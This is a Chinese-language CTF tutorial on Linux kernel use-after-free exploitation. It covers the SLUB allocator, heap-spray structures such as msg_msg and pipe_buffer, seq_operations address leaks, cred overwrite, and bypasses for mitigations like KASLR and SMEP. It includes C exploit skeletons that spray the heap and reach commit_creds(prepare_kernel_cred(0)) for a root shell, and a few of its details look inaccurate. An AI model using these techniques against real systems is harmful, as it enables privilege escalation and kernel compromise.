## 1. UAF 简介

### 1.1 什么是 UAF

UAF（Use-After-Free，释放后使用）是一种经典的内存安全漏洞。其核心问题在于：**程序在释放（free）某块内存后，没有将指向该内存的指针置空（清零），导致后续代码仍然可以通过该悬空指针访问已被释放的内存区域。**

### 1.2 内核态 UAF 与用户态 UAF 的相似性

内核态的 UAF 与用户态的 UAF 在本质上是相似的——**都是在某一个结构体释放后，忘记将指针清空**。

### 1.3 内核 UAF 的两种常见情况

#### 情况一：结构体 A 本身不存在函数指针，但 free 后可以 edit

> **利用思路：** 需要让另一个含有函数指针的结构体 B 放入相同位置（即占用被释放的内存），之后通过 edit 操作修改结构体 B 中的函数指针，从而劫持控制流。

```
结构体 A（无函数指针）──free──> 释放内存
                                    │
                                    ▼
结构体 B（有函数指针）──malloc──> 占用同一块内存
                                    │
                                    ▼
                              edit 修改函数指针 → 劫持 RIP
```

#### 情况二：结构体 A 本身有函数指针，但 free 之后无法 edit

> **利用思路：** 需要分配一个可以 edit 的结构体 B 放入相同位置，通过结构体 B 的 edit 能力来修改结构体 A 遗留的函数指针。

```
结构体 A（有函数指针）──free──> 释放内存（指针未清空）
                                    │
                                    ▼
结构体 B（可 edit）──malloc──> 占用同一块内存
                                    │
                                    ▼
                         通过 B 修改 A 的函数指针 → 劫持 RIP
```

### 1.4 结构体 A 与结构体 B 的来源

- **结构体 A**：通常是题目（CTF 题目 / 实际漏洞）提供的自定义结构体
- **结构体 B**：可以调用 Linux 操作系统自带的一些设备/系统调用获得（如 `msgsnd`、`pipe`、`setxattr` 等）

## 2. 内核内存管理：SLUB 分配器

### 2.1 SLUB 分配器概述

Linux 内核使用 **SLUB 分配器**（Slab Allocator 的改进版本）来管理内核对象的内存分配。它是内核中最常用的内存分配机制，类似于用户态的 `ptmalloc`。

### 2.2 SLUB 与 ptmalloc 的区别

| 特性 | ptmalloc（用户态） | SLUB（内核态） |
|------|-------------------|---------------|
| bin 分割单位 | 大部分以 **0x10** 为单位分割 | 基本以 **2^n** 为单位进行管理 |
| 管理方式 | 基于 chunk 的 bin 链表 | 基于 kmem_cache 的 slab 页面 |
| 查看方式 | `malloc_info()` | `cat /proc/slabinfo` |

### 2.3 SLUB 的 cache 大小

SLUB 分配器按照 2 的幂次方大小管理内存，常见的 kmem_cache 大小如下：

```
kmem_cache-8      (8 字节)
kmem_cache-16     (16 字节)
kmem_cache-32     (32 字节)
kmem_cache-64     (64 字节)
kmem_cache-96     (96 字节)
kmem_cache-128    (128 字节)
kmem_cache-192    (192 字节)
kmem_cache-256    (256 字节)
kmem_cache-512    (512 字节)
kmem_cache-1024   (1024 字节)
kmem_cache-2048   (2048 字节)
kmem_cache-4096   (4096 字节)
kmem_cache-8192   (8192 字节)
```

> 此外还有 `dma-kmalloc-*` 系列，用于 DMA 区域的内存分配。

### 2.5 kmalloc 的调用方式

在调用 `kmalloc` 的时候，根据值是不是常量，会用不同的方式进行调用：

- **如果值是常量**：将直接去选择对应的 `kmem_cache`
- **如果值是非常量**：会通过通用的分配路径，根据请求大小找到最合适的 cache

### 2.6 SLUB 中的 free 与 kmalloc 行为

> **关于 SLUB 中的 free 与 kmalloc，可以简单地认为：free 以后，再次 malloc 就会拿到 free 的那一块内存。**

这是 UAF 利用的核心前提——释放后的内存会被重新分配给新的对象，如果旧指针未被清空，就会产生悬空指针访问。

## 3. 结构体简介

在内核 UAF 利用中，理解内核结构体的布局和作用至关重要。内核中的各种结构体（struct）代表了不同的内核对象，它们通过 SLUB 分配器进行内存管理。

### 3.1 结构体与 kmem_cache 的对应关系

每个内核结构体类型通常对应一个专属的 `kmem_cache`。例如：

- `struct file` → `filp` cache
- `struct msg_msg` → `msg_msg` cache
- `struct cred` → `cred_jar` cache
- `struct pipe_buffer` → `pipe_buffer` cache

### 3.2 结构体大小的选择

在进行 UAF 利用时，需要确保**结构体 B 的大小与结构体 A 的大小落在同一个 kmem_cache 中**，这样 free A 之后 malloc B 才能精确地占用同一块内存。

## 4. 常见结构体详解

### 4.1 常见结构体分类

#### 一、可用于 Leak / AAR（任意地址读）/ AAW（任意地址写）/ RIP 劫持的结构体

| 序号 | 结构体 | 说明 |
|------|--------|------|
| 1 | `shm_file_data` | 共享内存文件数据 |
| 2 | `seq_operations` | 序列操作结构体，常用于 leak 内核地址 |
| 3 | `msg_msg` (+user-supplied data) | 消息队列消息结构体，大小灵活 |
| 4 | `subprocess_info` | 子进程信息结构体 |
| 5 | `cred` | 凭证结构体，修改 uid/gid 可提权 |
| 6 | `file` | 文件对象结构体 |
| 7 | `timerfd_ctx` | 定时器文件描述符上下文 |
| 8 | `tty_struct` | 终端设备结构体 |
| 9 | `pipe_buffer` | 管道缓冲区结构体 |
| 10 | `packet_socket` | 数据包套接字结构体 |
| 11 | `sk_buff` | 网络套接字缓冲区（线性数据区） |

#### 二、可用于任意数据写入 / 堆喷的结构体

| 序号 | 结构体 / 系统调用 | 说明 |
|------|-------------------|------|
| 1 | `msg_msg` —— `msgsnd()` | 消息发送，可控制数据内容 |
| 2 | `sendmsg()` | 套接字消息发送 |
| 3 | `setxattr` | 设置扩展属性 |
| 4 | `pipe()` —— `pipe_buffer` | 管道创建与写入 |
| 5 | `add_key()` | 添加密钥到内核密钥环 |
| 6 | `sk_buff` | 网络数据包缓冲区 |

### 4.2 重点结构体详解：msg_msg

#### 4.2.1 为什么选择 msg_msg？

对于 UAF 利用中的**第二种情况**（结构体 A 有函数指针但 free 后无法 edit），常用结构体是 **`msg_msg`**，原因如下：

- **大小灵活**：可以申请的 size 十分灵活，能够匹配不同大小的 kmem_cache
- **数据可控**：用户空间可以完全控制消息内容
- **限制**：头部的 **0x30 个字节无法控制**（包含 `m_list`、`m_type`、`m_ts` 等内核管理字段）

#### 4.2.2 msg_msg 结构体定义

```c
struct msg_msg {
    struct list_head m_list;   // 0x00 - 链表指针（16 字节）
    long m_type;               // 0x10 - 消息类型（8 字节）
    size_t m_ts;               // 0x18 - 消息文本大小（8 字节）
    struct msg_msgseg *next;   // 0x20 - 下一个段指针（8 字节）
    // 0x28 开始是安全字段（8 字节）
    // 0x30 开始才是用户数据
    void *security;
    /* the actual message text immediately follows */
};
```

> **关键**：用户只能控制 **0x30 字节以后**的内容。前 0x30 字节由内核填充。

#### 4.2.3 构造方式：msgsnd() 发送，msgrcv() 接收

```c
// 只能控制 0x30 字节以后的内容
struct {
    long mtype;
    char mtext[BUFF_SIZE];
} msg;

// 布置用户空间的内容
memset(msg.mtext, 0x42, BUFF_SIZE - 1);
msg.mtext[BUFF_SIZE] = 0;

// 创建消息队列
int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

// 设置消息类型（必须 > 0）
msg.mtype = 1;

// 假设此时已经产生释放对象，但指针未清空
// 大量发送消息以占用被释放的内存（堆喷）
for (int i = 0; i < 120; i++) {
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
}

// 触发 UAF 即可
```

## 5. 题目利用思路

### 5.1 通用利用流程

```
┌─────────────────────────────────────────────────────────┐
│  1. 分析题目提供的结构体 A（大小、字段、操作接口）         │
│  2. 确定 A 的 kmem_cache 大小                             │
│  3. 选择合适的结构体 B（大小匹配、有利用价值）             │
│  4. 触发 free(A)，但指针未清空                             │
│  5. 分配 B 占用同一块内存（堆喷 / 精确分配）               │
│  6. 通过 B 的接口修改关键数据（函数指针 / 地址）           │
│  7. 触发 UAF 访问，劫持控制流或实现提权                    │
└─────────────────────────────────────────────────────────┘
```

### 5.2 Leak 内核地址

利用 `seq_operations` 等结构体进行内核地址泄漏：

```c
// 打开 /proc/self/stat 等 seq_file 接口
int fd = open("/proc/self/stat", O_RDONLY);

// read 时会调用 seq_operations 中的函数指针
// 如果该结构体被我们控制，可以泄漏内核地址
char buf[0x100];
read(fd, buf, sizeof(buf));
```

`seq_operations` 结构体包含四个函数指针：

```c
struct seq_operations {
    void *(*start)(struct seq_file *m, loff_t *pos);
    void (*stop)(struct seq_file *m);
    void *(*next)(struct seq_file *m, loff_t *pos);
    int (*show)(struct seq_file *m, void *v);
};
```

通过 UAF 让 `seq_operations` 落在我们可控的内存上，read 时就会调用我们设置的函数指针，从而泄漏内核基址。

### 5.3 提权（修改 cred）

`cred` 结构体保存了进程的凭证信息（uid、gid 等）：

```c
struct cred {
    atomic_t usage;
    kuid_t uid;          // 真实用户 ID
    kgid_t gid;          // 真实组 ID
    kuid_t suid;         // 保存的设置用户 ID
    kgid_t sgid;         // 保存的设置组 ID
    kuid_t euid;         // 有效用户 ID
    kgid_t egid;         // 有效组 ID
    // ...
};
```

通过 UAF 将 `cred` 结构体替换为我们可控的数据，将所有 uid/gid 字段设置为 0，即可获得 root 权限。

### 5.4 RIP 劫持

通过修改结构体中的函数指针（如 `seq_operations` 中的 `show` 指针），使其指向我们的 shellcode 或 ROP chain，从而劫持内核执行流。

## 6. 实战代码示例

### 6.1 完整 UAF 利用框架（C 语言）

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ipc.h>

#define BUFF_SIZE 0x80  // 根据目标结构体大小调整

// msg_msg 消息结构
struct msgbuf {
    long mtype;
    char mtext[BUFF_SIZE];
};

// 获取内核地址（通过 /proc/kallsyms 或 leak）
unsigned long kernel_base = 0;
unsigned long commit_creds_addr = 0;
unsigned long prepare_kernel_cred_addr = 0;

// 提权 payload
void get_root_payload() {
    // commit_creds(prepare_kernel_cred(0))
    // 实际中需要通过 ROP 或函数指针调用
    char *(*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char *) = commit_creds_addr;
    cc(pkc(0));
}

// 堆喷：用 msg_msg 占用被释放的内存
void spray_msg_queue(int msqid, int count) {
    struct msgbuf msg;
    memset(&msg, 0, sizeof(msg));
    msg.mtype = 1;
    memset(msg.mtext, 0x41, BUFF_SIZE);  // 填充数据

    for (int i = 0; i < count; i++) {
        msgsnd(msqid, &msg, sizeof(msg.mtext), IPC_NOWAIT);
    }
}

// 清空消息队列
void clear_msg_queue(int msqid) {
    struct msgbuf msg;
    while (msgrcv(msqid, &msg, sizeof(msg.mtext), 1, IPC_NOWAIT) > 0);
}

int main() {
    // 1. 打开题目提供的设备
    int fd = open("/dev/vuln_device", O_RDWR);
    if (fd < 0) {
        perror("open device failed");
        return 1;
    }

    // 2. 创建消息队列
    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (msqid < 0) {
        perror("msgget failed");
        return 1;
    }

    // 3. 分配结构体 A（题目提供的对象）
    // ioctl(fd, ALLOC_CMD, size);

    // 4. 释放结构体 A（触发 UAF）
    // ioctl(fd, FREE_CMD, 0);

    // 5. 堆喷：用 msg_msg 占用被释放的内存
    spray_msg_queue(msqid, 120);

    // 6. 触发 UAF 访问
    // ioctl(fd, USE_CMD, 0);

    // 7. 提权
    // system("/bin/sh");

    close(fd);
    return 0;
}
```

### 6.2 利用 seq_operations 泄漏内核地址

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/msg.h>

#define SPRAY_COUNT 200
#define MSG_SIZE 0x30  // seq_operations 大小为 0x20，选择 0x30 的 cache

struct msgbuf {
    long mtype;
    char mtext[MSG_SIZE];
};

int main() {
    // 1. 打开 seq_file 接口（分配 seq_operations）
    int seq_fd = open("/proc/self/stat", O_RDONLY);

    // 2. 释放 seq_operations（通过 close 后重新 open 不同的 fd 触发）
    // 具体取决于题目逻辑

    // 3. 堆喷 msg_msg 占用 seq_operations 的位置
    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    struct msgbuf msg;
    msg.mtype = 1;
    memset(msg.mtext, 0x42, MSG_SIZE);

    for (int i = 0; i < SPRAY_COUNT; i++) {
        msgsnd(msqid, &msg, MSG_SIZE, IPC_NOWAIT);
    }

    // 4. 读取 seq_file，触发函数指针调用
    // 如果 msg_msg 成功占位，read 会访问我们控制的数据
    char buf[0x100];
    read(seq_fd, buf, sizeof(buf));

    // 5. 从输出中提取泄漏的内核地址
    unsigned long *leaked = (unsigned long *)buf;
    printf("Leaked address: 0x%lx\n", leaked[0]);

    // 计算内核基址
    unsigned long kernel_base = leaked[0] - OFFSET;
    printf("Kernel base: 0x%lx\n", kernel_base);

    return 0;
}
```

### 6.3 利用 pipe 进行堆喷

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define PIPE_COUNT 100
#define PIPE_SIZE 0x40  // 根据目标 cache 大小调整

int pipe_fds[PIPE_COUNT][2];
char pipe_buf[PIPE_SIZE];

// 分配管道并写入数据
void spray_pipe() {
    memset(pipe_buf, 0x43, PIPE_SIZE);

    for (int i = 0; i < PIPE_COUNT; i++) {
        if (pipe(pipe_fds[i]) < 0) {
            perror("pipe failed");
            exit(1);
        }
        write(pipe_fds[i][1], pipe_buf, PIPE_SIZE);
    }
}

// 释放管道
void free_pipe(int start, int count) {
    for (int i = start; i < start + count; i++) {
        close(pipe_fds[i][0]);
        close(pipe_fds[i][1]);
    }
}

int main() {
    // 堆喷
    spray_pipe();

    // 释放部分管道，制造空洞
    free_pipe(10, 5);

    // 此时 kmem_cache 中有 5 个空洞
    // 触发题目的 free 操作，让目标对象释放到同一 cache
    // 然后重新分配管道占用该内存

    return 0;
}
```

## 7. 总结与拓展

### 7.1 核心要点回顾

| 要点 | 说明 |
|------|------|
| UAF 本质 | 释放内存后指针未清空，悬空指针仍可访问 |
| SLUB 分配 | 以 2^n 为单位管理，free 后 malloc 会复用同一块内存 |
| 结构体选择 | B 的大小必须与 A 落在同一 kmem_cache |
| msg_msg 优势 | 大小灵活、数据可控，但头部 0x30 字节不可控 |
| 利用目标 | Leak 内核地址 → 计算基址 → 劫持控制流 → 提权 |

### 7.2 常见利用链

```
UAF 漏洞
  ├── Leak 阶段
  │     ── seq_operations / tty_struct / pipe_buffer → 泄漏内核地址
  ├── 劫持阶段
  │     ├── 修改 cred → 直接提权
  │     ├── 修改函数指针 → ROP chain → commit_creds(prepare_kernel_cred(0))
  │     └── 修改 tty_operations → 劫持 ioctl/read/write 调用
  └── 执行阶段
        ── system("/bin/sh") 获取 root shell
```

### 7.3 防御机制

| 防御机制 | 说明 | 绕过思路 |
|----------|------|----------|
| KASLR | 内核地址空间布局随机化 | 需要先 leak 内核基址 |
| SMEP | 禁止内核执行用户空间代码 | 使用 ROP 而非直接跳转 shellcode |
| SMAP | 禁止内核访问用户空间数据 | 使用内核空间的数据 |
| KPTI | 内核页表隔离 | 增加 leak 难度，但不影响 UAF 本身 |
| slab_freelist_hardened | 随机化 freelist | 增加堆喷难度，需要更多次尝试 |
